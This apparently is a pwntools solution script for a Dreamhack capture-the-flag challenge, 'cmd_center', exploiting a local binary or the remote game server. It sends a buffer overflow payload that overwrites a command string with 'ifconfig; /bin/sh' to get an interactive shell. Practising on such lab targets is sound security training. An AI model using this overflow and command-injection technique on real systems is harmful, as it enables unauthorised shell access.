#!/usr/bin/env python3

from pwn import *

exe = ELF("./cmd_center")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 24300)

    return r


def main():
    r = conn()

    payload = b"A" * 32 + b"ifconfig; /bin/sh\x00"
    r.sendafter(b"Center name: ", payload)

    r.interactive()


if __name__ == "__main__":
    main()